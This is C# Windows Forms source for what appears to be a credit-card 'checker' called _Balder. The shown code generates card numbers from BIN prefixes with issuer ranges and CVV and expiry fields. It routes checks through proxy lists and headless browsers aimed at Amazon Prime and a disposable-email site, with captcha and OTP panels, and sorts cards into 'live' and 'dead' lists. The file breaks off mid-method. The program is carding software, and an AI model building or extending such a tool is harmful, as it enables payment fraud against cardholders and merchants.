using Bogus;

using CefSharp;
using CefSharp.OffScreen;

using FontAwesome.Sharp;

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Net;
using System.Reflection.Emit;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;

namespace Asgard
{
    public partial class _Balder : Form, IForm
    {
        private string Bin { set; get; }
        private string Quatity { set; get; }
        private string Email { set; get; }
        private string EmailOTP { set; get; }
        private int UserId { set; get; }
        private string Token { set; get; }
        private int GateId { set; get; }
        private string FullName { set; get; }
        private string Password { set; get; }

        List<List<string>> CreditCards { set; get; }
        List<List<string>> LiveCreditCards { set; get; }
        List<List<string>> DieCreditCards { set; get; }
        List<List<string>> Valkyries { set; get; }
        List<List<string>> LiveValkyries { set; get; }

        #region Range Credit Cards
        private static readonly string[] rangeAmex = new[] { "34", "37" };//American Express
        private static readonly string[] rangeCUP = new[] { "62" };//China Union Pay
        private static readonly string[] rangeDCCB = new[] { "300-305" };//Diners Club Carte Blanche
        private static readonly string[] rangeDCI = new[] { "36", "38" };//Diners Club International
        private static readonly string[] rangeDCUSC = new[] { "54", "55" };//Diners Club United States & Canada
        private static readonly string[] rangeDC = new[] { "6011", "622126-622925", "644-649", "65" };//Discover Card
        private static readonly string[] rangeIntP = new[] { "636" };//InterPayment
        private static readonly string[] rangeInsP = new[] { "637-639" };//InstaPayment
        private static readonly string[] rangeJCB = new[] { "3528-3589" };//JCB
        private static readonly string[] rangeM = new[] { "50", "56-58", "6" };//Maestro
        private static readonly string[] rangeMC = new[] { "2221-2720", "51-55" };//Master Card
        private static readonly string[] rangeUATP = new[] { "1" };//UATP
        private static readonly string[] rangeV = new[] { "4" };//Visa
        #endregion

        private string cvvDigits = "###";

        private static ChromiumWebBrowser browser;
        private static ChromiumWebBrowser browser2;

        private static IFrame frame;

        private const string initialUrl = "https://www.amazon.es/amazonprime";

        private Faker Faker { set; get; }


        private bool IconButtonGenerarClick = false;
        private bool ShowPanelValkyrie = false;
        private bool IconButtonValkyrieVerifyClick = false;
        private bool IconButtonGenerarStopClick = false;
        private Color IconButtonGenerarIconColor;
        private bool IconButtonGenerarEnabled;
        private bool forsetiError = false;
        private string textCaptchaResolve;
        private string textCaptchaResolve2;
        private int countRefreshEmail = 0;
        private int limitRefreshEmail = 4;

        private CancellationTokenSource tokenCancel;

        private bool running = true;

        SoundPlayer Valhalla;
        SoundPlayer Valkyrie;

        public _Balder()
        {
            InitializeComponent();
            Faker = new Faker();
            Control.CheckForIllegalCrossThreadCalls = false;
        }
        private void _Balder_Load(object sender, EventArgs e)
        {
            ControlsInit();
        }
        public void InitializeParameters(params object[] parameters)
        {
            if (parameters.Length == 2)
            {
                UserId = (int)parameters[0];
                Token = parameters[1].ToString();
            }
        }

        #region General
        #region Controls Events
        private void IconButtonBack_Click(object sender, EventArgs e)
        {
            Form form = Parent.Controls.OfType<Aesir>().FirstOrDefault();
            if (form == null)
            {
                //form = new Aesir();
                Parent.Parent.Show();
                Parent.Parent.BringToFront();
                form.TopLevel = false;
                form.Dock = DockStyle.Fill;
                Parent.Parent.Controls.Add(form);
                Parent.Parent.Tag = form;
                form.BringToFront();
                form.Show();
            }
            else
            {
                form.BringToFront();
            }
        }
        private void IconButtonClose_Click(object sender, EventArgs e)
        {
            this.Close();
        }
        #endregion
        #region Methods
        private void ControlsInit()
        {
            Yggdrasil.God = "_Balder";
            GateId = 1;
            Bin = string.Empty;
            TextBoxBin.ContextMenuStrip = new ContextMenuStrip();
            TextBoxBin.Placeholder("######xxxxxxxxxx");
            MaskedTextBoxDate.ContextMenuStrip = new ContextMenuStrip();
            MaskedTextBoxDate.Placeholder("dd/aa");
            TextBoxCvv.ContextMenuStrip = new ContextMenuStrip();
            TextBoxCvv.Placeholder(cvvDigits);
            TextBoxCvv.MaxLength = 3;
            TextBoxQuantity.ContextMenuStrip = new ContextMenuStrip();

            IconButtonGenerar.IconColor = Color.Black;
            IconButtonGenerar.Enabled = false;
            IconButtonGenerarStop.Hide();
            IconButtonVerify.IconColor = Color.Black;
            IconButtonVerify.Enabled = false;
            IconButtonStop.IconColor = Color.Black;
            IconButtonStop.Enabled = false; ;
            IconButtonClear.IconColor = Color.Black;
            IconButtonClear.Enabled = false;
            IconButtonValkyrieClear.IconColor = Color.Black;
            IconButtonValkyrieClear.Enabled = false;
            IconButtonValkyrieStart.IconColor = Color.Black;
            IconButtonValkyrieStart.Enabled = false;
            IconButtonValkyrieVerify.IconColor = Color.Black;
            IconButtonValkyrieVerify.Enabled = false;
            IconButtonValkyrieStop.Hide();

            CircularProgressBarGeneral.Minimum = 0;
            CircularProgressBarGeneral.Maximum = 100;
            pictureBox1.Hide();
            pictureBox2.Hide();
            pictureBox3.Hide();
            pictureBox4.Hide();
            pictureBox5.Hide();
            pictureBox6.Hide();
            PanelValkyrie.Hide();
            PanelValkyrieLive.Hide();
            PanelValkyrieDie.Hide();
            PanelCaptcha.Hide();
            PanelPhone.Hide();
            PanelOTP.Hide();
            PanelCaptcha2.Hide();
            CircularProgressBarGeneral.Value = 0;
            CircularProgressBarDetail.Value = 0;
            Valhalla = new SoundPlayer(@"Valhalla.wav");
            Valkyrie = new SoundPlayer(@"Valkyrie.wav");
        }
        #endregion
        #endregion

        #region Checker
        #region Panel Generator
        #region Panel Events
        private void PanelGenerator_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxBin = new Rectangle(TextBoxBin.Location.X, TextBoxBin.Location.Y, TextBoxBin.ClientSize.Width, TextBoxBin.ClientSize.Height);
            borderTextBoxBin.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxBin, Color.White, ButtonBorderStyle.Solid);

            Rectangle borderMaskedTextBoxDate = new Rectangle(MaskedTextBoxDate.Location.X, MaskedTextBoxDate.Location.Y, MaskedTextBoxDate.ClientSize.Width, MaskedTextBoxDate.ClientSize.Height);
            borderMaskedTextBoxDate.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderMaskedTextBoxDate, Color.White, ButtonBorderStyle.Solid);

            Rectangle borderTextBoxCvv = new Rectangle(TextBoxCvv.Location.X, TextBoxCvv.Location.Y, TextBoxCvv.ClientSize.Width, TextBoxCvv.ClientSize.Height);
            borderTextBoxCvv.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxCvv, Color.White, ButtonBorderStyle.Solid);

            Rectangle borderTextBoxQuantity = new Rectangle(TextBoxQuantity.Location.X, TextBoxQuantity.Location.Y, TextBoxQuantity.ClientSize.Width, TextBoxQuantity.ClientSize.Height);
            borderTextBoxQuantity.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxQuantity, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion

        #region Controls Events
        #region TextBoxBin Events
        private void TextBoxBin_Enter(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            textBox.Placeholder("######xxxxxxxxxx");
        }
        private void TextBoxBin_Leave(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            textBox.Placeholder("######xxxxxxxxxx");
            Bin = textBox.Text;
            CompleteBin(textBox);
        }
        private void TextBoxBin_KeyUp(object sender, KeyEventArgs e)
        {
            try
            {
                if (Bin == string.Empty && (e.KeyCode == Keys.D0 || e.KeyCode == Keys.NumPad0))
                {
                    e.SuppressKeyPress = true;
                    return;
                }
            }
            catch (Exception) { }
        }
        private void TextBoxBin_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (Bin == string.Empty && (e.KeyCode == Keys.D0 || e.KeyCode == Keys.NumPad0))
                {
                    e.SuppressKeyPress = true;
                    return;
                }

                if (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
                {
                    Bin += (char)e.KeyValue;
                }
                else if (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.NumPad9)
                {
                    Bin += Convert.ToChar(e.KeyCode - 48);
                }
                else if (e.KeyCode == Keys.Back)
                {
                    int startIndex = Bin.Length - 1;
                    if (startIndex >= 0)
                    {
                        Bin = Bin.Remove(startIndex);
                        Task.Run(() => InfoBinList());
                    }
                    else
                    {
                        e.SuppressKeyPress = true;
                        return;
                    }
                }
                else if (e.KeyCode == Keys.Tab && Bin.Length < 6)
                {
                    e.SuppressKeyPress = true;
                    return;
                }
                else if (e.KeyCode == Keys.V && e.Control)
                {
                    e.SuppressKeyPress = false;
                }
                else
                {
                    e.SuppressKeyPress = true;
                    return;
                }
                Task.Run(() => InfoBinList(Bin));
            }
            catch (Exception) { }
        }
        private void TextBoxBin_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            Bin = textBox.Text;
            if (ModifierKeys.HasFlag(Keys.Control))
            {
                int textLenght = textBox.TextLength;
                for (int i = 0; i < textLenght; i++)
                {
                    if (i < 6)
                    {
                        if (Regex.IsMatch(textBox.Text.Substring(i, 1), "[^0-9]"))
                        {
                            textBox.Clear();
                            break;
                        }
                    }
                    else if (Regex.IsMatch(textBox.Text.Substring(i, 1), @"[^x-xX-X0-9]"))
                    {
                        textBox.Clear();
                        break;
                    }
                }
                CompleteBin(textBox);
                Bin = textBox.Text;
                Task.Run(() => InfoBinList(Bin));
            }
        }
        private void TextBoxBin_Validating(object sender, CancelEventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            string text = textBox.Text;
            if (text == "######xxxxxxxxxx")
            {
                text = string.Empty;
            }

            if (string.IsNullOrEmpty(text))
            {
                IconButtonGenerar.IconColor = Color.Black;
                IconButtonGenerar.Enabled = false;
            }
            else
            {
                if (text.Length < 6)
                {
                    IconButtonGenerar.IconColor = Color.Black;
                    IconButtonGenerar.Enabled = false;
                }
                else
                {
                    if (!ValidateBin(text))
                    {
                        IconButtonGenerar.IconColor = Color.Black;
                        IconButtonGenerar.Enabled = false;
                    }
                    else
                    {
                        IconButtonGenerar.IconColor = Color.White;
                        IconButtonGenerar.Enabled = true;
                        IconButtonClear.IconColor = Color.White;
                        IconButtonClear.Enabled = true;

                    }
                }
            }
        }
        #endregion
        #region MaskedBoxDate Events
        private void MaskedTextBoxDate_Enter(object sender, EventArgs e)
        {
            MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
            maskedTextBox.Placeholder("dd/aa");
            MaskedTextBoxDate.Mask = "##/##";
            string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
            this.BeginInvoke((MethodInvoker)delegate ()
            {
                if (text.Length > 2)
                {
                    maskedTextBox.Select(text.Length + 1, 0);
                }
                else
                {
                    maskedTextBox.Select(text.Length, 0);
                }
            });
        }
        private void MaskedTextBoxDate_Leave(object sender, EventArgs e)
        {
            MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
            string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
            if (string.IsNullOrEmpty(text) || text.Length < 4)
            {
                maskedTextBox.Clear();
                MaskedTextBoxDate.Mask = "";
                maskedTextBox.Placeholder("dd/aa");
                maskedTextBox.Select(0, 0);
            }

        }
        private void MaskedTextBoxDate_KeyUp(object sender, KeyEventArgs e)
        {
            MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
            string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
            if (text.Length > 0)
            {
                if (text.Length == 1)
                {
                    if (Regex.IsMatch(text, @"([^0-1])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
                else if (text.Length == 2)
                {
                    if (Regex.IsMatch(text, @"^(0[^1-9]|1[^0-2])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
                else if (text.Length == 3)
                {
                    if (Regex.IsMatch(text, @"([^2-2])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
                else if (text.Length == 4)
                {
                    if (Regex.IsMatch(text, @"([^0-9])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
            }
        }
        private void MaskedTextBoxDate_TextChanged(object sender, EventArgs e)
        {
            if (ModifierKeys.HasFlag(Keys.Control))
            {
                MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
                string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
                if (text.Length > 0)
                {
                    for (int i = 0; i < text.Length; i++)
                    {
                        if (i == 0)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"([^0-1])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                        else if (i == 1)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"^(0[^1-9]|1[^0-2])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                        else if (i == 2)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"([^2-2])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                        else if (i == 3)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"([^0-9])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                    }
                }
            }
        }
        #endregion
        #region TxtBoxCvv Events
        private void TextBoxCvv_Enter(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            textBox.Placeholder(cvvDigits);
        }
        private void TextBoxCvv_Leave(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            if (textBox.TextLength < cvvDigits.Length)
            {
                textBox.Clear();
            }
            textBox.Placeholder(cvvDigits);
        }
        private void TextBoxCvv_KeyUp(object sender, KeyEventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            if (Regex.IsMatch(textBox.Text, "[^0-9]"))
            {
                textBox.Text = textBox.Text.Remove(textBox.TextLength - 1);
            }
        }
        private void TextBoxCvv_TextChanged(object sender, EventArgs e)
        {
            if (ModifierKeys.HasFlag(Keys.Control))
            {
                TextBox textBox = (TextBox)sender;
                if (Regex.IsMatch(textBox.Text, "[^0-9]"))
                {
                    textBox.Clear();
                    textBox.Select(0, 0);
                }
            }
        }
        #endregion
        #region TextBoxQuantity Events
        private void TextBoxQuatity_TextChanged(object sender, EventArgs e)
        {
            if (ModifierKeys.HasFlag(Keys.Control))
            {
                TextBox textBox = (TextBox)sender;
                if (Regex.IsMatch(textBox.Text, "[^0-9]"))
                {
                    textBox.Clear();
                    textBox.Select(0, 0);
                }
            }
        }
        private void TextBoxQuatity_KeyUp(object sender, KeyEventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            if (Regex.IsMatch(textBox.Text, "[^0-9]"))
            {
                textBox.Text = textBox.Text.Remove(textBox.TextLength - 1);
            }
        }
        private void TextBoxQuatity_Leave(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            if (textBox.Text == string.Empty)
            {
                textBox.Text = "10";
            }
        }
        #endregion
        #region IconButtonGenerar Events
        private async void IconButtonGenerar_Click(object sender, EventArgs e)
        {
            try
            {
                if (ValidateChildren(ValidationConstraints.Enabled))
                {
                    IconButton iconButton = (IconButton)sender;
                    iconButton.IconColor = Color.Black;
                    iconButton.Enabled = false;
                    IconButtonVerify.IconColor = Color.Black;
                    IconButtonVerify.Enabled = false;
                    IconButtonStop.IconColor = Color.Black;
                    IconButtonStop.Enabled = false;
                    IconButtonClear.IconColor = Color.Black;
                    IconButtonClear.Enabled = false;
                    IconButtonValkyrie.IconColor = Color.Black;
                    IconButtonValkyrie.Enabled = false;
                    IconButtonGenerarStop.Show();
                    IconButtonGenerarClick = true;
                    await ConsoleProgressGeneral("Iniciando Motor del Generador.", 0);
                    await GenerateCreditCards();
                    await ConsoleProgressGeneral("Material de pago generado correctamente.", 100, "Success");
                    await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
                    IconButtonGenerarStop.Hide();
                    iconButton.IconColor = Color.White;
                    iconButton.Enabled = true;
                    IconButtonVerify.IconColor = Color.White;
                    IconButtonVerify.Enabled = true;
                    IconButtonClear.IconColor = Color.White;
                    IconButtonClear.Enabled = true;
                    IconButtonValkyrie.IconColor = Color.White;
                    IconButtonValkyrie.Enabled = true;
                    IconButtonGenerarClick = false;
                }
            }
            catch (Exception) { }
        }
        #endregion
        #region IconButtonGenerarStop Events
        private void IconButtonGenerarStop_Click(object sender, EventArgs e)
        {
            if (tokenCancel != null)
            {
                IconButton iconbutton = (IconButton)sender;
                iconbutton.IconColor = Color.Black;
                iconbutton.Enabled = false;
                IconButtonGenerarStopClick = true;
                tokenCancel.Cancel();
                tokenCancel.Dispose();
                tokenCancel = null;
                //IconButtonGenerar.IconColor = Color.White;
                //IconButtonGenerar.Enabled = true;
                //if(CreditCards != null)
                //{
                //    if(CreditCards.Count > 0)
                //    {
                //        IconButtonVerify.IconColor = Color.White;
                //        IconButtonVerify.Enabled = true;
                //    }
                //}
            }
        }
        #endregion
        #endregion

        #region Validations
        public bool ValidateBin(string text)
        {
            try
            {
                RangeAndLength[] range = AllCards();
                int rangeLength = range.Length;
                for (int j = 0; j < rangeLength; j++)
                {
                    string pattern = @"\b" + range[j].Range;
                    Match match = Regex.Match(text, pattern);
                    if (match.Success)
                    {
                        return true;
                    }
                }
                return false;
            }
            catch (Exception) { }
            return false;
        }

        #endregion

        #region Methods
        private void CompleteBin(TextBox textBox)
        {
            if (textBox.TextLength >= 6)
            {

                int textLenght = textBox.TextLength;
                int cardLenght = 0;
                Dictionary<int, int> precision = new Dictionary<int, int>();
                RangeAndLength[] range = AllCards();
                int rangeLength = range.Length;
                for (int j = 0; j < rangeLength; j++)
                {
                    string pattern = @"\b" + range[j].Range;
                    Match match = Regex.Match(textBox.Text, pattern);
                    if (match.Success)
                    {
                        precision.Add(j, int.Parse(match.Value));
                    }
                }

                if (precision.Count > 0)
                {
                    RangeAndLength card = range[precision.OrderByDescending(x => x.Value).First().Key];
                    cardLenght = card.Length;
                    textBox.MaxLength = cardLenght;

                    if (card.Range == "34" || card.Range == "37")
                    {
                        cvvDigits = "####";
                        TextBoxCvv.MaxLength = 4;
                    }
                    else
                    {
                        cvvDigits = "###";
                        TextBoxCvv.MaxLength = 3;
                    }

                    if (textLenght >= 6 && textLenght < cardLenght)
                    {
                        int limit = cardLenght - textLenght;
                        string ext = "";
                        for (int i = 0; i < limit; i++)
                        {
                            ext += "x";
                        }
                        textBox.Text += ext;
                    }
                }
                else
                {
                    cvvDigits = "###";
                    TextBoxCvv.MaxLength = 3;
                }

                textBox.Select(textBox.TextLength, 0);
                TextBoxCvv.ForeColor = Color.Silver;
                TextBoxCvv.Text = cvvDigits;
            }
        }
        #endregion
        #endregion

        #region Panel Console
        #region Methods
        public async Task ConsoleProgressGeneral(string info, int value = 101, string status = null)
        {
            try
            {
                LabelInfoGeneralConsole.ForeColor = Color.White;
                int delay = 100;
                if (status == "Success")
                {
                    LabelInfoGeneralConsole.ForeColor = Color.FromArgb(17, 97, 238);
                    delay = 3000;
                }
                else if (status == "Fail")
                {
                    LabelInfoGeneralConsole.ForeColor = Color.DarkRed;
                    delay = 5000;
                }

                if (value != 101)
                {
                    CircularProgressBarGeneral.Value = value;
                    CircularProgressBarGeneral.Text = CircularProgressBarGeneral.Value.ToString();
                }
                //await Task.Delay(100);
                LabelInfoGeneralConsole.Text = info;
                await Task.Delay(delay);
            }
            catch (Exception) {/* throw;*/ }
        }

        public async Task ConsoleProgressDetail(string info, int value = 101, string status = null)
        {
            try
            {
                LabelInfoGeneralConsole.ForeColor = Color.White;
                int delay = 10;
                if (status == "Success")
                {
                    LabelInfoGeneralConsole.ForeColor = Color.FromArgb(17, 97, 238);
                    delay = 3000;
                }
                else if (status == "Fail")
                {
                    LabelInfoGeneralConsole.ForeColor = Color.DarkRed;
                    delay = 5000;
                }

                if (value != 101)
                {
                    CircularProgressBarDetail.Value = value;
                    CircularProgressBarDetail.Text = CircularProgressBarDetail.Value.ToString();
                }
                await Task.Delay(100);

                LabelInfoGeneralConsole.Text = info;
                await Task.Delay(delay);
            }
            catch (Exception) {/* throw;*/ }
        }
        #endregion
        #endregion

        #region Panel Information
        #region Cotrols Events
        private async void IconButtonValkyrie_Click(object sender, EventArgs e)
        {
            if (ShowPanelValkyrie)
            {
                IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
                IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
                PanelValkyrie.Hide();
                PanelValkyrieLive.Hide();
                PanelValkyrieDie.Hide();
                ShowPanelValkyrie = false;
                await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
                await ConsoleProgressDetail("ODIN PADRE DE TODO.", 0);
            }
            else
            {
                IconButtonGenerarIconColor = IconButtonGenerar.IconColor;
                IconButtonGenerarEnabled = IconButtonGenerar.Enabled;

                if (IconButtonGenerarEnabled)
                {
                    IconButtonGenerar.IconColor = Color.Black;
                    IconButtonGenerar.Enabled = false;
                }
                PanelValkyrie.Show();
                PanelValkyrieLive.Show();
                PanelValkyrieDie.Show();
                ShowPanelValkyrie = true;
                await ConsoleProgressGeneral("VALKIRIAS (PROXYS)", 0);
                await ConsoleProgressDetail("VALKIRIAS (PROXYS)", 0);
            }
        }
        #endregion

        #region Methods
        private async Task InfoBinList(string bin = null)
        {
            try
            {
                if (bin != null)
                {
                    if (bin.Length >= 8)
                    {
                        bin = bin.Substring(0, 8);

                        pictureBox1.Show();
                        pictureBox2.Show();
                        pictureBox3.Show();
                        pictureBox4.Show();
                        pictureBox5.Show();
                        pictureBox6.Show();


                        dynamic binList = await Asatru.InfoBin(bin);
                        if (binList != null)
                        {
                            pictureBox1.Hide();
                            pictureBox2.Hide();
                            pictureBox3.Hide();
                            pictureBox4.Hide();
                            pictureBox5.Hide();
                            pictureBox6.Hide();
                            LabelGetBin.Text = bin;
                            LabelGetSchema.Text = binList.scheme ?? "-";
                            LabelGetType.Text = binList.type ?? "-";
                            LabelGetBrand.Text = binList.brand ?? "-";
                            LabelGetBank.Text = binList.bank.name ?? "-";
                            LabelGetCountry.Text = binList.country.name ?? "-";
                        }
                        else
                        {
                            pictureBox1.Hide();
                            pictureBox2.Hide();
                            pictureBox3.Hide();
                            pictureBox4.Hide();
                            pictureBox5.Hide();
                            pictureBox6.Hide();
                            LabelGetBin.Text = bin;
                            LabelGetSchema.Text = "-";
                            LabelGetType.Text = "-";
                            LabelGetBrand.Text = "-";
                            LabelGetBank.Text = "-";
                            LabelGetCountry.Text = "-";
                        }
                    }
                    else
                    {
                        pictureBox1.Hide();
                        pictureBox2.Hide();
                        pictureBox3.Hide();
                        pictureBox4.Hide();
                        pictureBox5.Hide();
                        pictureBox6.Hide();
                        LabelGetBin.Text = bin;
                        LabelGetSchema.Text = "-";
                        LabelGetType.Text = "-";
                        LabelGetBrand.Text = "-";
                        LabelGetBank.Text = "-";
                        LabelGetCountry.Text = "-";
                    }
                }
            }
            catch (Exception) { }
        }
        #endregion
        #endregion

        #region Panel Credit Cards
        #region Panel Events
        private void PanelCreditCards_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxCreditCards = new Rectangle(TextBoxCreditCards.Location.X, TextBoxCreditCards.Location.Y, TextBoxCreditCards.ClientSize.Width + 17, TextBoxCreditCards.ClientSize.Height);
            borderTextBoxCreditCards.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxCreditCards, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion

        #region Controls Events
        private void TextBoxCreditCards_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            try
            {
                LabelCountCreditCards.Text = textBox.Lines.Count().ToString();
                string creditCards = textBox.Text.Trim();
                if (ModifierKeys.HasFlag(Keys.Control))
                {
                    if (creditCards.Contains("\r\n"))
                    {
                        string[] listCreditCards = creditCards.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                        int listcreditCardsLength = listCreditCards.Length;
                        CreditCards = new List<List<string>>();
                        for (int i = 0; i < listcreditCardsLength; i++)
                        {
                            string[] listCreditCard = listCreditCards[i].Split('|');
                            CreditCards.Add(new List<string>());
                            CreditCards[i].Add(listCreditCard[0]);
                            CreditCards[i].Add(listCreditCard[1]);
                            CreditCards[i].Add(listCreditCard[2]);
                            CreditCards[i].Add(listCreditCard[3]);
                        }
                        if (!IconButtonGenerarClick)
                        {
                            IconButtonVerify.IconColor = Color.White;
                            IconButtonVerify.Enabled = true;
                            IconButtonClear.IconColor = Color.White;
                            IconButtonClear.Enabled = true;
                        }
                        Task.Run(() => InfoBinList(CreditCards[0][0]));
                    }
                    else if (creditCards.Contains("|"))
                    {
                        CreditCards = new List<List<string>>();
                        string[] listCreditCard = creditCards.Split('|');
                        CreditCards.Add(new List<string>());
                        CreditCards[0].Add(listCreditCard[0]);
                        CreditCards[0].Add(listCreditCard[1]);
                        CreditCards[0].Add(listCreditCard[2]);
                        CreditCards[0].Add(listCreditCard[3]);
                        if (!IconButtonGenerarClick)
                        {
                            IconButtonVerify.IconColor = Color.White;
                            IconButtonVerify.Enabled = true;
                            IconButtonClear.IconColor = Color.White;
                            IconButtonClear.Enabled = true;
                        }
                        Task.Run(() => InfoBinList(CreditCards[0][0]));
                    }
                    else
                    {
                        textBox.Text = string.Empty;
                        IconButtonVerify.IconColor = Color.Black;
                        IconButtonVerify.Enabled = false;
                        IconButtonClear.IconColor = Color.Black;
                        IconButtonClear.Enabled = false;
                    }
                }
                else
                {
                    if (creditCards == string.Empty)
                    {
                        textBox.Text = string.Empty;
                        IconButtonVerify.IconColor = Color.Black;
                        IconButtonVerify.Enabled = false;
                        if (TextBoxValhalla.Text == string.Empty && TextBoxHelheim.Text == string.Empty && IconButtonGenerar.Enabled == false)
                        {
                            IconButtonClear.IconColor = Color.Black;
                            IconButtonClear.Enabled = false;
                        }
                    }
                }
            }
            catch (Exception)
            {
                textBox.Text = string.Empty;
                IconButtonVerify.IconColor = Color.Black;
                IconButtonVerify.Enabled = false;
                IconButtonClear.IconColor = Color.Black;
                IconButtonClear.Enabled = false;
            }
        }
        private async void IconButtonVerify_Click(object sender, EventArgs e)
        {
            try
            {
                IconButtonGenerarIconColor = IconButtonGenerar.IconColor;
                IconButtonGenerarEnabled = IconButtonGenerar.Enabled;
                IconButton iconButton = (IconButton)sender;
                iconButton.IconColor = Color.Black;
                iconButton.Enabled = false;
                IconButtonGenerar.IconColor = Color.Black;
                IconButtonGenerar.Enabled = false;
                IconButtonClear.IconColor = Color.Black;
                IconButtonClear.Enabled = false;
                IconButtonValkyrie.IconColor = Color.Black;
                IconButtonValkyrie.Enabled = false;
                IconButtonStop.IconColor = Color.White;
                IconButtonStop.Enabled = true;
                running = true;
                Task.Run(() => InvokeHermoor());
                await Invoke_Balder();
                await ConsoleProgressGeneral("_Balder finalizo Verificación.", 100, "Success");
                await ConsoleProgressDetail("_Balder finalizo Verificación.", 100, "Success");
                await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
                await ConsoleProgressDetail("ODIN PADRE DE TODO.", 0);
                IconButtonClear.IconColor = Color.White;
                IconButtonClear.Enabled = true;
                IconButtonValkyrie.IconColor = Color.White;
                IconButtonValkyrie.Enabled = true;
            }
            catch (Exception) { }
        }
        #endregion
        #endregion

        #region Panel Valhalla
        #region Panel Events
        private void PanelValhalla_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxValhalla = new Rectangle(TextBoxValhalla.Location.X, TextBoxValhalla.Location.Y, TextBoxValhalla.ClientSize.Width + 17, TextBoxValhalla.ClientSize.Height);
            borderTextBoxValhalla.Inflate(1, 1); // border thickness
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValhalla, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion
        #region Contols Events
        private void TextBoxValhalla_TextChanged(object sender, EventArgs e)
        {
            try
            {
                TextBox textBox = (TextBox)sender;
                LabelCountValhalla.Text = textBox.Lines.Count().ToString();

                Valhalla.Play();

            }
            catch (Exception) { }
        }
        private async void IconButtonStop_Click(object sender, EventArgs e)
        {

            IconButton iconButton = (IconButton)sender;
            iconButton.IconColor = Color.Black;
            iconButton.Enabled = false;

            await tokenCancel.Kill();
            await browser.Kill("www.amazon.com");
            await browser2.Kill("www.mohmal.com");

            await ConsoleProgressGeneral("Odin esta siendo Detenido.", 0, "Success");
            await ConsoleProgressDetail("Odin esta siendo Detenido.", 0, "Success");
            await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
            await ConsoleProgressDetail("ODIN PADRE DE TODO.", 0);
            IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
            IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
            IconButtonClear.IconColor = Color.White;
            IconButtonClear.Enabled = true;
            IconButtonValkyrie.IconColor = Color.White;
            IconButtonValkyrie.Enabled = true;
            if (CreditCards != null)
            {
                if (CreditCards.Count > 0)
                {
                    IconButtonVerify.IconColor = Color.White;
                    IconButtonVerify.Enabled = true;

                }
                else
                {
                    TextBoxCreditCards.Clear();
                    IconButtonVerify.IconColor = Color.Black;
                    IconButtonVerify.Enabled = false;
                }
            }
        }
        #endregion
        #endregion

        #region Panel Hellheim
        #region Panel Events
        private void PanelHellheim_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxHelheim = new Rectangle(TextBoxHelheim.Location.X, TextBoxHelheim.Location.Y, TextBoxHelheim.ClientSize.Width + 17, TextBoxHelheim.ClientSize.Height);
            borderTextBoxHelheim.Inflate(1, 1); // border thickness
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxHelheim, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion


        #region Contols Events
        private void TextBoxHelheim_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            try
            {
